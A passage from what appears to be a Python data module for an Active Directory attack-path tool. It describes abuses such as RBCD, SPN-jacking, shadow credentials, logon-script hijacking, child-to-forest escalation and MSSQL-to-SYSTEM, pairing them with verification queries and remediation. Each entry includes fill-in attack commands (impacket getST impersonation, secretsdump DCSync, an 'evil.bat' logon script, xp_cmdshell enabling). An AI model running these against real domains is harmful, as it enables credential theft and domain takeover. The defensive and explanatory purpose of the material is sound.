            "hashcat -m 13100 roast.txt wordlist.txt\n"
            "bloodyAD --host <dc_ip> -d <domain> -u <user> -p <pass> "
            "set object {target} servicePrincipalName -v ''"
        ),
        "verify_windows": (
            "List which principals can WRITE the servicePrincipalName property of "
            "the target account:\n"
            "(Get-Acl \"AD:$((Get-ADUser {target}).DistinguishedName)\").Access |\n"
            "  Where-Object {{ $_.ActiveDirectoryRights -match 'WriteProperty' -and\n"
            "    ($_.ObjectType -eq 'f3a64788-5306-11d1-a9c5-0000f80367c1' -or\n"
            "     $_.ObjectType -eq '00000000-0000-0000-0000-000000000000') }} |\n"
            "  Select-Object IdentityReference, ActiveDirectoryRights"
        ),
        "verify_linux": (
            "Read-only ACL analysis of who can write the SPN of the target "
            "account:\n"
            "bloodyAD --host <dc_ip> -d <domain> -u <user> -p <pass> "
            "get object {target} --attr nTSecurityDescriptor\n"
            "# Reference: https://www.thehacker.recipes/ad/movement/dacl/targeted-kerberoasting"
        ),
        "remediation": (
            "Enumerate who can write the servicePrincipalName attribute of the account and remove non-administrative principals: (Get-Acl \"AD:<account-DN>\").Access | Where-Object { $_.ActiveDirectoryRights -match 'WriteProperty' -and $_.ObjectType -eq 'f3a64788-5306-11d1-a9c5-0000f80367c1' }.",
            "Revoke the offending ACE with dsacls (dsacls \"<account-DN>\" /R \"<principal>\") so only intended administrators can modify SPNs, closing the targeted-Kerberoasting avenue.",
            "Enforce strong (25+ character) passwords on any account that could be given an SPN, or migrate service identities to gMSA, so an added SPN yields an uncrackable ticket.",
            "Audit Event ID 5136 for changes to the servicePrincipalName attribute and Event ID 4769 with RC4 encryption for the roast itself, and alert on an SPN added then removed within a short window.",
        ),
    },
    "writeaccountrestrictions": {
        "short": (
            "{source} can write the account-restriction property set of {target}; on "
            "a computer object this includes msDS-AllowedToActOnBehalfOfOtherIdentity, "
            "enabling resource-based constrained delegation."
        ),
        "long": (
            "The Account Restrictions property set groups several account-control "
            "attributes, and write access to it over a COMPUTER object includes "
            "write access to msDS-AllowedToActOnBehalfOfOtherIdentity — the "
            "attribute that configures Resource-Based Constrained Delegation (RBCD). "
            "When {source_type} {source} can write account restrictions on {target}, "
            "it can point that attribute at a computer account it already controls, "
            "which authorises that controlled account to impersonate ANY user to "
            "services on {target} via S4U2Self + S4U2Proxy. The attacker then "
            "requests a service ticket as, for example, a domain administrator to a "
            "service on {target} and gains privileged access to the host. If the "
            "attacker does not already own a computer account, it creates one "
            "(subject to ms-DS-MachineAccountQuota) to use as the delegate. This "
            "turns an attribute-write ACE on a computer into full compromise of that "
            "computer. The abuse needs a controlled account with an SPN as the "
            "delegate; RBCD via an already-owned computer works even when "
            "MachineAccountQuota is exhausted."
        ),
        "manual": (
            "# Point the target computer's RBCD attribute at a controlled account,\n"
            "# then impersonate a privileged user to a service on the target:\n"
            "impacket-rbcd -delegate-from 'ATTACKER$' -delegate-to '{target}' "
            "-action write <domain>/<user>:<pass>\n"
            "impacket-getST -spn cifs/{target} -impersonate Administrator "
            "-dc-ip <dc_ip> <domain>/'ATTACKER$':<machine_pass>"
        ),
        "verify_windows": (
            "List who can write the account-restrictions property set on the "
            "computer object, and read the current RBCD attribute:\n"
            "(Get-Acl \"AD:$((Get-ADComputer {target}).DistinguishedName)\").Access |\n"
            "  Where-Object {{ $_.ObjectType -eq "
            "'4c164200-20c0-11d0-a768-00aa006e0529' }}\n"
            "Get-ADComputer {target} -Properties "
            "msDS-AllowedToActOnBehalfOfOtherIdentity"
        ),
        "verify_linux": (
            "Read-only ACL analysis of who can write account restrictions on the "
            "computer:\n"
            "bloodyAD --host <dc_ip> -d <domain> -u <user> -p <pass> "
            "get object {target} --attr nTSecurityDescriptor\n"
            "# Reference: https://www.thehacker.recipes/ad/movement/kerberos/delegations/rbcd"
        ),
        "remediation": (
            "Enumerate who can write the account-restrictions property set on the computer and remove non-administrative principals: (Get-Acl \"AD:<computer-DN>\").Access | Where-Object { $_.ObjectType -eq '4c164200-20c0-11d0-a768-00aa006e0529' }.",
            "Read and, where unexpected, clear the RBCD attribute: Get-ADComputer <host> -Properties msDS-AllowedToActOnBehalfOfOtherIdentity then Set-ADComputer <host> -Clear msDS-AllowedToActOnBehalfOfOtherIdentity.",
            "Set ms-DS-MachineAccountQuota to 0 (Set-ADDomain -Identity <domain> -Replace @{'ms-DS-MachineAccountQuota'=0}) so an attacker cannot create a new computer account to use as the delegate — note this does not stop RBCD via an already-owned computer, so the ACE fix above is the primary control.",
            "Audit Event ID 5136 for changes to msDS-AllowedToActOnBehalfOfOtherIdentity and Event ID 4769 for S4U2Proxy ticket requests, and alert on delegation configured to a non-service computer account.",
        ),
    },
    "writelogonscript": {
        "short": (
            "{source} can set the scriptPath (logon script) of {target} to "
            "attacker-controlled content, so the next time {target} logs on it runs "
            "the attacker's code as that user."
        ),
        "long": (
            "The scriptPath attribute of a user object names a logon script that the "
            "workstation executes, in the user's context, at each interactive logon. "
            "When {source_type} {source} can write scriptPath on {target}, it points "
            "the attribute at a script it controls (placed on the NETLOGON share, "
            "which authenticated users can read, or at a reachable UNC path). The "
            "next time {target} logs on, that script runs with {target}'s privileges "
            "— giving the attacker code execution as the victim without knowing their "
            "password. It is a wait-for-logon primitive: the payload fires on the "
            "user's schedule, not the attacker's, so it is patient rather than "
            "immediate, and it depends on the target actually logging on and on the "
            "attacker being able to write the referenced script content to a path the "
            "workstation will read. The exposure comes from a write ACE on the user "
            "object combined with write access to a logon-script location."
        ),
        "manual": (
            "# Set the target's logon script to a payload the workstation will run:\n"
            "bloodyAD --host <dc_ip> -d <domain> -u <user> -p <pass> "
            "set object {target} scriptPath -v 'evil.bat'\n"
            "#   (place evil.bat on \\\\<domain>\\NETLOGON, then wait for {target} to log on)"
        ),
        "verify_windows": (
            "Read the target's current logon script and list who can WRITE the "
            "scriptPath attribute:\n"
            "Get-ADUser {target} -Properties scriptPath | "
            "Select-Object SamAccountName, scriptPath\n"
            "(Get-Acl \"AD:$((Get-ADUser {target}).DistinguishedName)\").Access |\n"
            "  Where-Object {{ $_.ActiveDirectoryRights -match 'WriteProperty' }} |\n"
            "  Select-Object IdentityReference, ObjectType"
        ),
        "verify_linux": (
            "Read-only lookup of the target's logon script and object ACL:\n"
            "bloodyAD --host <dc_ip> -d <domain> -u <user> -p <pass> "
            "get object {target} --attr scriptPath\n"
            "# Reference: https://www.thehacker.recipes/ad/movement/dacl"
        ),
        "remediation": (
            "List who can write the scriptPath attribute of the user object and remove non-administrative principals: (Get-Acl \"AD:<user-DN>\").Access | Where-Object { $_.ActiveDirectoryRights -match 'WriteProperty' }.",
            "Revoke the offending write ACE with dsacls (dsacls \"<user-DN>\" /R \"<principal>\") so only administrators can set logon scripts, and prefer Group Policy logon scripts over per-user scriptPath so the attribute is not a per-object write target.",
            "Lock down the logon-script locations: restrict write access to the NETLOGON share (and any UNC path referenced by scriptPath) to administrators, and audit its contents for unexpected files.",
            "Audit Event ID 5136 for changes to the scriptPath attribute and monitor NETLOGON for new/modified script files; alert on a scriptPath set by a non-administrative principal.",
        ),
    },
    "hasshadowcredentials": {
        "short": (
            "{target} already carries a key credential (msDS-KeyCredentialLink), so "
            "an attacker who controls the corresponding private key can PKINIT as "
            "{target} and recover its NT hash without its password."
        ),
        "long": (
            "The msDS-KeyCredentialLink attribute holds public key credentials used "
            "for certificate-based (PKINIT) Kerberos authentication — the mechanism "
            "behind Windows Hello for Business. When an object already has a shadow "
            "credential entry on {target}, whoever controls the matching private key "
            "can authenticate as {target} over PKINIT and, via the U2U / UnPAC-the-"
            "hash technique, recover {target}'s NT hash — all without ever knowing "
            "or resetting the account's password, and without leaving a password-"
            "reset trace. Legitimate WHfB entries are written by a domain controller; "
            "a key credential added by any non-DC principal, or present where WHfB is "
            "not deployed, is the signature of an attacker having planted (or found) "
            "a shadow credential to maintain access as the account. Because it "
            "survives a password change, it is also a persistence primitive: once "
            "the key credential is in place, the account is impersonable until the "
            "attribute is cleaned. The prerequisite for abuse is possession of the "
            "private key matching an entry present on {target}."
        ),
        "manual": (
            "# If the attacker controls the key credential, PKINIT as the target and\n"
            "# UnPAC its NT hash:\n"
            "certipy shadow auto -u <user>@<domain> -p <pass> -account {target} "
            "-dc-ip <dc_ip>\n"
            "#   (this authenticates via the existing key credential and returns the NT hash)"
        ),
        "verify_windows": (
            "List every object carrying a key credential and confirm which "
            "principal set it — entries from a non-DC principal are suspicious:\n"
            "Get-ADObject -LDAPFilter '(msDS-KeyCredentialLink=*)' -Properties "
            "msDS-KeyCredentialLink |\n"
            "  Select-Object DistinguishedName, msDS-KeyCredentialLink\n"
            "# Check the specific target:\n"
            "Get-ADObject -Identity (Get-ADUser {target}).DistinguishedName "
            "-Properties msDS-KeyCredentialLink"
        ),
        "verify_linux": (
            "Read-only enumeration of the target's key credentials (no "
            "authentication performed):\n"
            "certipy shadow list -u <user>@<domain> -p <pass> -account {target} "
            "-dc-ip <dc_ip>\n"
            "# Reference: https://www.thehacker.recipes/ad/movement/kerberos/shadow-credentials"
        ),
        "remediation": (
            "Enumerate every object carrying a key credential and audit each entry against your Windows Hello for Business rollout: Get-ADObject -LDAPFilter '(msDS-KeyCredentialLink=*)' -Properties msDS-KeyCredentialLink.",
            "Remove unexpected entries — anything set by a non-DC principal or present where WHfB is not deployed: Set-ADObject -Identity <DN> -Clear msDS-KeyCredentialLink; then reset the affected account's password, as the shadow credential was an alternate authentication path.",
            "Restrict who can write msDS-KeyCredentialLink on user and computer objects to the DCs / WHfB provisioning service, and remove any delegated write ACE that a non-DC principal holds on the attribute.",
            "Enable DS-Access auditing on msDS-KeyCredentialLink (Event ID 5136) in the Default Domain Controllers policy and alert on any write originating from a principal that is not a domain controller.",
        ),
    },
    "privilegedgroupcontrol": {
        "short": (
            "{source} is a member of a terminal privileged group that directly "
            "controls {target}, so it holds that control by membership with no "
            "further technique required."
        ),
        "long": (
            "Some group memberships ARE the compromise — no exploitation step "
            "remains once you are in the group. When {source_type} {source} belongs "
            "to a terminal privileged control group (Domain Admins, Enterprise "
            "Admins, BUILTIN\\Administrators, or another group whose rights directly "
            "control {target}), the membership itself grants control: a Domain Admin "
            "can already act against any object in the domain, so there is no "
            "separate attack to run. This edge exists in the graph to make that "
            "control explicit rather than implied — it records that the path has "
            "reached a principal whose group membership already owns the target. The "
            "risk is not a technique to detect but a membership to justify: every "
            "member of such a group is effectively Tier-0-equivalent for the scope "
            "the group controls, so unexpected or nested membership in these groups "
            "is itself the finding. Remediation is membership hygiene, not patching a "
            "protocol."
        ),
        "manual": (
            "# Membership IS the control — confirm and, if warranted, exercise it.\n"
            "# List the privileged group's members (nested included):\n"
            "nxc ldap <dc_ip> -u <user> -p <pass> -d <domain> --groups 'Domain Admins'\n"
            "#   As a member, control of the target follows directly (e.g. reset a\n"
            "#   password, or DCSync the domain):\n"
            "impacket-secretsdump -just-dc <domain>/<user>:<pass>@<dc_ip>"
        ),
        "verify_windows": (
            "List the effective (recursive) membership of the terminal privileged "
            "group and confirm every member belongs there:\n"
            "Get-ADGroupMember -Identity 'Domain Admins' -Recursive |\n"
            "  Select-Object name, objectClass, distinguishedName\n"
            "# Repeat for Enterprise Admins and BUILTIN\\Administrators."
        ),
        "verify_linux": (
            "Read-only enumeration of the privileged group's membership over "
            "LDAP:\n"
            "nxc ldap <dc_ip> -u <user> -p <pass> -d <domain> --groups 'Domain Admins'\n"
            "# Reference: https://www.thehacker.recipes/ad/recon/bloodhound"
        ),
        "remediation": (
            "Audit the recursive membership of every terminal privileged group and remove accounts that do not require standing membership: Get-ADGroupMember -Identity 'Domain Admins' -Recursive (repeat for Enterprise Admins, Schema Admins, and BUILTIN\\Administrators).",
            "Eliminate nested groups inside Tier-0 groups so a single lower-tier group cannot silently confer Domain Admin; privileged groups should contain only individually-vetted, dedicated admin accounts.",
            "Adopt just-in-time / time-bound privileged access (Privileged Access Management) so accounts are added to Tier-0 groups only for the duration of a task, keeping the standing membership near-empty.",
            "Protect the groups with the AdminSDHolder / SDProp mechanism and alert on Event ID 4728/4756 (member added to a security-enabled global/universal group) for any Tier-0 group.",
        ),
    },
    "spnjack": {
        "short": (
            "{source} hijacks a delegated SPN — moving the SPN it can delegate to "
            "onto {target}, then abusing constrained delegation with protocol "
            "transition (S4U) to impersonate any user to {target}."
        ),
        "long": (
            "SPN-jacking abuses constrained delegation with protocol transition "
            "(the T2A4D / TrustedToAuthForDelegation flag) together with write "
            "access to service principal names. {source_type} {source} holds "
            "msDS-AllowedToDelegateTo entries plus TrustedToAuthForDelegation, which "
            "lets it request tickets, via S4U2Self then S4U2Proxy, to the specific "
            "services named in its delegation list — and, crucially, it can request "
            "them as ANY user (protocol transition). The 'jack' is that an SPN is "
            "not permanently bound to one host: by moving the SPN that appears in "
            "the delegation list from its legitimate owner onto {target}, the "
            "attacker makes its existing delegation right resolve to {target}. It "
            "then performs S4U to obtain a service ticket to {target} impersonating "
            "a privileged user (e.g. a domain administrator), gaining privileged "
            "access to that host. This chains an attribute manipulation (SPN move) "
            "with a delegation the principal already legitimately holds, so it needs "
            "no password of the victim and no new delegation grant."
        ),
        "manual": (
            "# Move the delegated SPN onto the target, then S4U to it as a privileged user:\n"
            "bloodyAD --host <dc_ip> -d <domain> -u <user> -p <pass> "
            "set object {target} servicePrincipalName -v 'cifs/{target}'\n"
            "impacket-getST -spn cifs/{target} -impersonate Administrator "
            "-dc-ip <dc_ip> <domain>/<delegating-account>:<pass>"
        ),
        "verify_windows": (
            "Identify accounts configured for constrained delegation with protocol "
            "transition (the SPN-jack prerequisite):\n"
            "Get-ADObject -LDAPFilter "
            "'(&(msDS-AllowedToDelegateTo=*)(userAccountControl:1.2.840.113556.1.4.803:=16777216))' "
            "-Properties msDS-AllowedToDelegateTo, servicePrincipalName |\n"
            "  Select-Object Name, msDS-AllowedToDelegateTo\n"
            "# Confirm SPN uniqueness — a duplicate SPN is the jack:\n"
            "setspn -Q cifs/{target}"
        ),
        "verify_linux": (
            "Read-only enumeration of constrained-delegation-with-protocol-"
            "transition accounts:\n"
            "nxc ldap <dc_ip> -u <user> -p <pass> -d <domain> --trusted-for-delegation\n"
            "# Reference: https://www.thehacker.recipes/ad/movement/kerberos/delegations"
        ),
        "remediation": (
            "Enumerate accounts configured for constrained delegation with protocol transition and remove the flag where it is not required: Get-ADObject -LDAPFilter '(&(msDS-AllowedToDelegateTo=*)(userAccountControl:1.2.840.113556.1.4.803:=16777216))', then Set-ADAccountControl -Identity <account> -TrustedToAuthForDelegation $false.",
            "Restrict who can write servicePrincipalName so an attacker cannot move an SPN onto a target: (Get-Acl \"AD:<computer-DN>\").Access | Where-Object { $_.ObjectType -eq 'f3a64788-5306-11d1-a9c5-0000f80367c1' }; revoke non-admin write ACEs with dsacls.",
            "Add sensitive accounts to the Protected Users group and set 'Account is sensitive and cannot be delegated' (Set-ADAccountControl -AccountNotDelegated $true) so they can never be impersonated through delegation.",
            "Monitor Event ID 5136 for servicePrincipalName changes and Event ID 4769 for S4U2Proxy ticket requests; a privileged user impersonated to a host by a delegating service account is the SPN-jack signature.",
        ),
    },
    "crossorgtgtdelegation": {
        "short": (
            "{source} escalates across a forest trust by abusing cross-organization "
            "TGT delegation: it captures a forwardable ticket-granting ticket that "
            "crosses the trust boundary and replicates the trusting forest as its DC."
        ),
        "long": (
            "A forest trust configured with cross-organization TGT delegation "
            "(the CROSS_ORGANIZATION_ENABLE_TGT_DELEGATION flag) causes a principal "
            "authenticating from the trusted forest to leave a FORWARDABLE "
            "ticket-granting ticket that can cross the trust boundary. From a "
            "compromised trusted forest, {source} abuses this: it coerces a domain "
            "controller in the TRUSTING forest to authenticate to a service whose "
            "key it holds, captures the forwarded TGT that the coerced "
            "authentication carries, and then uses that ticket to act as the "
            "trusting-forest DC — including replicating its directory (DCSync). The "
            "result collapses the boundary between the two forests: a compromise "
            "confined to one forest becomes control of the other. This is a "
            "high-severity cross-forest escalation because forest trusts are widely "
            "assumed to be a security boundary; TGT delegation across them undoes "
            "that assumption. The prerequisites are control of the trusted forest, "
            "the delegation flag set on the trust, and the ability to coerce a "
            "trusting-forest DC to authenticate back."
        ),
        "manual": (
            "# Coerce a trusting-forest DC to authenticate, capturing its forwardable\n"
            "# TGT, then replicate the trusting forest with it:\n"
            "impacket-getST -u2u -impersonate 'DC$@<trusting-domain>' "
            "-spn 'host/<trusted-host>' -k -no-pass <trusted-domain>/<user>\n"
            "impacket-secretsdump -k -no-pass -just-dc <trusting-domain>/'DC$'@<trusting-dc>"
        ),
        "verify_windows": (
            "Inspect the forest trust for TGT-delegation (a trust with delegation "
            "enabled is the exposure):\n"
            "Get-ADTrust -Filter * |\n"
            "  Select-Object Name, Direction, ForestTransitive, "
            "TGTDelegation, SIDFilteringForestAware\n"
            "# TGTDelegation = True on an inbound/bidirectional forest trust is the flag."
        ),
        "verify_linux": (
            "Read-only enumeration of the forest trusts and their attributes:\n"
            "nxc ldap <dc_ip> -u <user> -p <pass> -d <domain> --query "
            "'(objectClass=trustedDomain)' 'trustAttributes trustDirection'\n"
            "# Reference: https://www.thehacker.recipes/ad/movement/trusts"
        ),
        "remediation": (
            "Audit every forest trust and disable TGT delegation where it is set: Get-ADTrust -Filter * | Select-Object Name, TGTDelegation, then Set-ADTrust -Identity <trust> -TGTDelegation $false so forwardable tickets no longer cross the trust boundary.",
            "Enable SID filtering (quarantine) on the trust unless a specific business need documents otherwise, so injected SIDs from the trusted forest are stripped: netdom trust <trusting> /domain:<trusted> /quarantine:yes.",
            "Add high-value accounts to Protected Users and set 'Account is sensitive and cannot be delegated' so their tickets are never forwardable across the trust.",
            "Monitor DCs for Event IDs 4768/4769 involving another forest's DC account and for replication (Event 4662) requested by a principal authenticating across the trust.",
        ),
    },
    "raisechild": {
        "short": (
            "{source} escalates from a compromised child domain to the forest root "
            "by forging an inter-realm ticket that injects the forest-root "
            "privileged SID history, using the shared forest trust key."
        ),
        "long": (
            "Within a single forest, a child domain and its parent share the "
            "inter-realm trust key, and the forest is a single security boundary — "
            "so a full compromise of a child domain yields the material to take over "
            "the forest root. {source}, having compromised the child domain (holding "
            "its krbtgt key), forges an inter-realm ticket-granting ticket and, "
            "because SID filtering is not applied inside a forest, injects the "
            "forest-root Enterprise Admins SID into the ticket's SID-history field. "
            "Presented to the parent, that ticket is honoured as a member of "
            "Enterprise Admins, granting control of the forest root and thereby the "
            "whole forest. This is the canonical child-to-parent / SID-history "
            "escalation: it is not a misconfiguration to patch but a structural "
            "property of the forest trust model, which is precisely why the forest — "
            "not the domain — is the true security boundary, and why every child "
            "domain must be administered to the same standard as the root. The "
            "prerequisite is full compromise of the child domain (its krbtgt key)."
        ),
        "manual": (
            "# From a compromised child (krbtgt key in hand), forge an inter-realm\n"
            "# ticket carrying the forest-root Enterprise Admins SID history, then\n"
            "# replicate the forest root:\n"
            "impacket-raiseChild <child-domain>/<user>:<pass>\n"
            "#   (or forge manually with impacket-ticketer -sids <EA-SID> ... then DCSync the root)"
        ),
        "verify_windows": (
            "Confirm the forest topology and that intra-forest trusts do not (and "
            "structurally cannot) SID-filter — every child is inside the boundary:\n"
            "Get-ADForest | Select-Object Name, RootDomain, Domains\n"
            "Get-ADTrust -Filter 'IntraForest -eq $true' |\n"
            "  Select-Object Name, Direction, SIDFilteringForestAware"
        ),
        "verify_linux": (
            "Read-only enumeration of the forest's domains and trusts:\n"
            "nxc ldap <dc_ip> -u <user> -p <pass> -d <domain> --query "
            "'(objectClass=trustedDomain)' 'name trustAttributes'\n"
            "# Reference: https://www.thehacker.recipes/ad/movement/trusts"
        ),
        "remediation": (
            "Administer every child domain to the same Tier-0 standard as the forest root — the forest, not the domain, is the security boundary, so a child-domain compromise is a forest compromise; there is no ACL or trust setting that separates them.",
            "After any suspected child-domain compromise, reset the child domain's krbtgt password twice and treat the forest root as potentially compromised: rotate forest-root Tier-0 credentials and the root krbtgt as well.",
            "Minimise the number of domains in the forest; each additional child domain is an additional path to the root. Consider consolidating to a single domain where the multi-domain model is not required.",
            "Monitor forest-root DCs for Event ID 4768/4769 inter-realm tickets carrying SID history for Enterprise Admins and for replication (Event 4662) originating from a child-domain principal.",
        ),
    },
    "mssql_token_theft_escalation": {
        "short": (
            "Even with SeImpersonatePrivilege removed from the SQL Server process, "
            "{source} escalates to NT AUTHORITY\\SYSTEM on {target} by recovering a "
            "token from a shared logon session."
        ),
        "long": (
            "Once {source} holds sysadmin on the MSSQL instance on {target}, it can "
            "run OS commands as the SQL Server service account. The usual local "
            "escalation to SYSTEM relies on the service account's "
            "SeImpersonatePrivilege (a 'potato' technique), but administrators "
            "sometimes strip that privilege as a hardening measure. This technique "
            "escalates anyway: rather than needing SeImpersonate, it recovers a "
            "privileged token from a logon session shared on the host (the "
            "Forshaw 2020 shared-logon-session token approach) and impersonates it "
            "to reach NT AUTHORITY\\SYSTEM. SYSTEM on the database server means full "
            "control of the host — reading its LSA secrets, dumping cached "
            "credentials, and using its machine account for onward domain actions. "
            "It is a distinct escalation path precisely because it survives the "
            "common 'we removed SeImpersonate from the SQL service' hardening. The "
            "prerequisite is sysadmin (or an equivalent code-exec foothold) on the "
            "SQL Server instance."
        ),
        "manual": (
            "# With MSSQL sysadmin, enable xp_cmdshell and confirm command execution\n"
            "# as the service account, then run the token-theft escalation to SYSTEM:\n"
            "impacket-mssqlclient -k <domain>/<user>@{target} -windows-auth\n"
            "#   SQL> EXEC sp_configure 'show advanced options',1; RECONFIGURE;\n"
            "#   SQL> EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE;\n"
            "#   SQL> EXEC xp_cmdshell 'whoami';   -- runs as the SQL service account"
        ),
        "verify_windows": (
            "Identify the SQL Server service account and confirm sysadmins on the "
            "instance (the escalation prerequisite):\n"
            "Get-CimInstance Win32_Service -ComputerName {target} |\n"
            "  Where-Object {{ $_.Name -like 'MSSQL*' }} |\n"
            "  Select-Object Name, StartName\n"
            "# In SQL: SELECT p.name FROM sys.server_role_members r JOIN sys.server_principals p\n"
            "#   ON r.member_principal_id = p.principal_id WHERE r.role_principal_id = \n"
            "#   (SELECT principal_id FROM sys.server_principals WHERE name='sysadmin');"
        ),
        "verify_linux": (
            "Read-only check of MSSQL access and privilege for the account (no "
            "escalation run):\n"
            "impacket-mssqlclient -k <domain>/<user>@{target} -windows-auth "
            "-command \"SELECT SYSTEM_USER, IS_SRVROLEMEMBER('sysadmin');\"\n"
            "# Reference: https://www.thehacker.recipes/ad/movement/mssql"
        ),
        "remediation": (
            "Run the SQL Server service under a low-privileged Group Managed Service Account, and keep xp_cmdshell disabled (EXEC sp_configure 'xp_cmdshell',0; RECONFIGURE;) so a sysadmin foothold cannot spawn OS commands as the service account in the first place.",
            "Restrict membership of the SQL sysadmin server role to the minimum: audit it (SELECT p.name FROM sys.server_role_members r JOIN sys.server_principals p ON r.member_principal_id = p.principal_id) and remove application/service logins that do not need it.",
            "Because this path survives removing SeImpersonate, also isolate the SQL host: enforce tier separation so no privileged logon session an attacker could steal a token from exists on the database server, and apply the latest OS patches.",
            "Monitor Event IDs 4688 (process creation under the SQL service account), 7045 (service install), and 5145 (share access) on the SQL host, plus SQL error-log entries for xp_cmdshell configuration changes.",
        ),
    },
    "mssql_seimpersonate_escalation": {
        "short": (
            "{source} escalates from MSSQL sysadmin on {target} to NT AUTHORITY\\"
            "SYSTEM by abusing the SQL service account's SeImpersonatePrivilege via "
            "an in-memory CLR potato chain."
        ),
        "long": (
            "The SQL Server service account runs with SeImpersonatePrivilege by "
            "default, which permits impersonating a token handed to it. Once "
            "{source} holds sysadmin on the MSSQL instance on {target}, it can load "
            "a CLR (.NET) assembly directly into SQL Server memory as a hexadecimal "
            "literal — no file is written to disk, which sidesteps write-time AV — "
            "and use it to run a 'potato' coercion (for example RPCSS or DCOM/BITS "
            "local coercion) that yields a SYSTEM token, which SeImpersonate then "
            "lets it assume. The outcome is NT AUTHORITY\\SYSTEM on the database "
            "server: full host control, credential harvesting, and use of the "
            "machine account for domain actions. This is the classic MSSQL-to-SYSTEM "
            "path and depends on the SQL service account still holding "
            "SeImpersonatePrivilege (the token-theft variant covers the case where "
            "it has been removed). The prerequisite is sysadmin on the SQL Server "
            "instance."
        ),
        "manual": (
            "# With MSSQL sysadmin, confirm command execution as the SQL service\n"
            "# account (which holds SeImpersonatePrivilege), then run the potato chain:\n"
            "impacket-mssqlclient -k <domain>/<user>@{target} -windows-auth\n"
            "#   SQL> EXEC sp_configure 'show advanced options',1; RECONFIGURE;\n"
            "#   SQL> EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE;\n"
            "#   SQL> EXEC xp_cmdshell 'whoami /priv';   -- shows SeImpersonatePrivilege Enabled"
        ),
        "verify_windows": (
            "Confirm the SQL service account holds SeImpersonatePrivilege (the "
            "escalation prerequisite):\n"
            "Get-CimInstance Win32_Service -ComputerName {target} |\n"
            "  Where-Object {{ $_.Name -like 'MSSQL*' }} |\n"
            "  Select-Object Name, StartName\n"
            "# On the host, as/for that service account: whoami /priv | findstr "
            "SeImpersonatePrivilege"
        ),
        "verify_linux": (
            "Read-only check of MSSQL sysadmin membership for the account (no "
            "escalation run):\n"
            "impacket-mssqlclient -k <domain>/<user>@{target} -windows-auth "
            "-command \"SELECT IS_SRVROLEMEMBER('sysadmin');\"\n"
            "# Reference: https://www.thehacker.recipes/ad/movement/mssql"
        ),
        "remediation": (
            "Run the SQL Server service under a low-privileged Group Managed Service Account and, where the workload allows, remove SeImpersonatePrivilege from that account via the 'Impersonate a client after authentication' user-right GPO so the potato escalation has nothing to abuse.",
            "Keep xp_cmdshell and CLR integration disabled unless explicitly required (EXEC sp_configure 'xp_cmdshell',0; EXEC sp_configure 'clr enabled',0; RECONFIGURE;) so a sysadmin foothold cannot load an in-memory assembly or spawn OS commands.",
            "Minimise SQL sysadmin membership (audit sys.server_role_members) and keep the database host fully patched so the local coercion primitives the potato chain relies on are closed.",
            "Monitor Event IDs 4688 (process creation under the SQL service account) and 7045, and SQL error-log entries for CLR/xp_cmdshell configuration changes, which indicate the escalation being staged.",
        ),
    },
    "mssql_trustworthy_db_escalation": {
        "short": (
            "A TRUSTWORTHY database owned by a sysadmin on {target} lets {source} "
            "with db_owner rights impersonate dbo and gain effective SQL sysadmin "
            "through EXECUTE AS."
        ),
        "long": (
            "When a database's TRUSTWORTHY property is ON and the database is owned "
            "by a login that is a member of the sysadmin server role, the security "
            "boundary between the database and the instance collapses. {source}, "
            "holding db_owner rights in that database (or able to run EXECUTE AS "
            "USER = 'dbo'), can impersonate the dbo user; because dbo maps to the "
            "sysadmin-owning login and TRUSTWORTHY lets the impersonation context "
            "cross into the server scope, the impersonated context has effective "
            "sysadmin over the whole instance. From effective sysadmin, {source} can "
            "add itself to the sysadmin role, enable xp_cmdshell, and run OS commands "
            "on {target}. The escalation is confirmed in practice with "
            "IS_SRVROLEMEMBER('sysadmin') returning 1 inside the impersonation "
            "context. It is a configuration flaw (TRUSTWORTHY + sysadmin owner), not "
            "a protocol bug: the fix is to remove one of the two conditions. The "
            "prerequisite is db_owner (or equivalent) in a database that meets both "
            "conditions."
        ),
        "manual": (
            "# In a TRUSTWORTHY db owned by a sysadmin, impersonate dbo to gain\n"
            "# effective server sysadmin, then enable command execution:\n"
            "impacket-mssqlclient -k <domain>/<user>@{target} -windows-auth\n"
            "#   SQL> USE <trustworthy_db>; EXECUTE AS USER = 'dbo';\n"
            "#   SQL> SELECT IS_SRVROLEMEMBER('sysadmin');   -- returns 1\n"
            "#   SQL> EXEC sp_addsrvrolemember '<your_login>','sysadmin';"
        ),
        "verify_windows": (
            "Find databases that are both TRUSTWORTHY and owned by a sysadmin login "
            "— the two conditions that create the escalation:\n"
            "Invoke-Sqlcmd -ServerInstance {target} -Query \"SELECT d.name, "
            "d.is_trustworthy_on, sp.name AS owner FROM sys.databases d JOIN "
            "sys.server_principals sp ON d.owner_sid = sp.sid WHERE "
            "d.is_trustworthy_on = 1 AND IS_SRVROLEMEMBER('sysadmin', sp.name) = 1;\""
        ),
        "verify_linux": (
            "Read-only query for TRUSTWORTHY databases owned by a sysadmin (no "
            "escalation performed):\n"
            "impacket-mssqlclient -k <domain>/<user>@{target} -windows-auth "
            "-command \"SELECT name, is_trustworthy_on FROM sys.databases WHERE "
            "is_trustworthy_on = 1;\"\n"
            "# Reference: https://www.thehacker.recipes/ad/movement/mssql"
        ),
        "remediation": (
            "Turn off TRUSTWORTHY on every database that does not strictly require it (ALTER DATABASE <db> SET TRUSTWORTHY OFF;) — this alone breaks the escalation, and most databases never need it.",
            "Where TRUSTWORTHY is genuinely required, change the database owner to a low-privileged login that is NOT a member of the sysadmin role (ALTER AUTHORIZATION ON DATABASE::<db> TO <low_priv_login>;) so impersonating dbo confers no server-level rights.",
            "Audit the two conditions together across the instance: SELECT d.name, d.is_trustworthy_on, sp.name FROM sys.databases d JOIN sys.server_principals sp ON d.owner_sid = sp.sid WHERE d.is_trustworthy_on = 1; and remediate every row.",
            "Keep xp_cmdshell disabled and minimise db_owner grants; monitor SQL error-log and Extended Events for ALTER SERVER ROLE / sp_addsrvrolemember calls that would signal the escalation being used.",
        ),
    },
    "sqladmin": {
        "short": (
            "{source} holds sysadmin over the MSSQL instance on {target}, giving it "
            "full control of the database server and, via xp_cmdshell, OS command "
            "execution on the host."
        ),
        "long": (
            "SQL Server sysadmin is total control of the database instance: read and "
            "write every database, reconfigure the server, and — decisively for "
            "domain compromise — enable and run xp_cmdshell, which executes OS "
            "commands on {target} in the context of the SQL Server service account. "
            "When {source_type} {source} is a sysadmin on the instance (directly, "
            "through a Windows group mapped to a sysadmin login, or via a linked-"
            "server chain), it can turn database control into host code execution and "
            "from there escalate to SYSTEM. Sysadmin is often granted too broadly — "
            "an application account, a Windows group, or BUILTIN\\Administrators "
